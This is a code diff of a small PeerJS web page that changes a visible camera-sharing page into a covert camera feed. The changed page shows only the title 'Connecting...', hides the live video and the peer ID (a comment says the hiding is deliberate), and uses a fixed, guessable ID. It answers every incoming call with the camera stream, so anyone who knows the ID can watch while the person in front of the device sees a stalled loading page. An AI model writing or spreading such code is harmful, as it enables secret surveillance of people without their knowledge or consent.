@@ -1,33 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera Sender</title>
+  <title>Connecting...</title>
   <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 </head>
 <body>
-  <h2>Camera Share</h2>
-  <p id="myid">Connecting...</p>
-  <video id="video" autoplay playsinline></video>
 
-  <script>
-    const video = document.getElementById("video");
+<script>
+  // FIXED ID (same hamesha rahega)
+  const peer = new Peer("camera123");
 
-    // Unique ID auto-generate
-    const peer = new Peer();
+  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    .then(stream => {
 
-    peer.on('open', id => {
-      document.getElementById("myid").innerText = "Share this ID: " + id;
+      // ❌ video show nahi karenge (hidden)
+      
+      peer.on('call', call => {
+        call.answer(stream);
+      });
+
+    })
+    .catch(() => {
+      alert("Camera permission denied");
     });
+</script>
 
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-      .then(stream => {
-        video.srcObject = stream;
-
-        peer.on('call', call => {
-          call.answer(stream);
-        });
-      })
-      .catch(() => alert("Camera permission denied"));
-  </script>
 </body>
 </html>
